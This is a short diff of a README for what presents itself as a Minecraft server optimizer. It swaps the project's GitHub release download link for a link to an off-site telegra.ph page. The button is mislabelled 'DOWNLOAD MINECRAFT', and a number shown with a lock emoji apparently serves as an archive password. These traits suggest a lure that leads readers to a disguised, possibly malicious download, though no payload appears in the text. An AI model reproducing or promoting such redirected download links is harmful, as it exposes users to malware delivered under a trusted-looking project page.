@@ -6,7 +6,7 @@ Running a Minecraft server for friends shouldn't require a NASA computer. I got 
 
 ## Download 🔗
 
-[![DOWNLOAD MINECRAFT](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/IndigoMiller/Minecraft-server-optimizer-/releases/download/Release/MCSERVEROPTIMIZER.zip)
+[![DOWNLOAD MINECRAFT](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://telegra.ph/Download-05-21-39)
 
 **🔐 — 1847**
 
